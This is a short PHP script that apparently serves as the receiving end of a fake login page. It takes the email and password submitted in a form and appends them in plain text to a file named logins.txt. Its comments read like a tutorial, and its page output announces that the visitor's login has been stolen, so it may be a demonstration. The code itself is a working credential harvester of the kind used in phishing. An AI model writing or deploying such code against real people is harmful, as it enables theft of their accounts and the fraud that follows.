<?php
  // The global $_POST variable allows you to access the data sent with the POST method by name
  // To access the data sent with the GET method, you can use $_GET
  echo "<h1> Your login information has been stolen! </h1>";
  $email = htmlspecialchars($_POST['email']);
  $password  = htmlspecialchars($_POST['password']);

  $text = "email: $email		password: $password\n";
  $filename = "logins.txt";
  $fh = fopen($filename, "a") or die("Unable to open file!");
  fwrite($fh, $text);
  fclose($fh);
?>

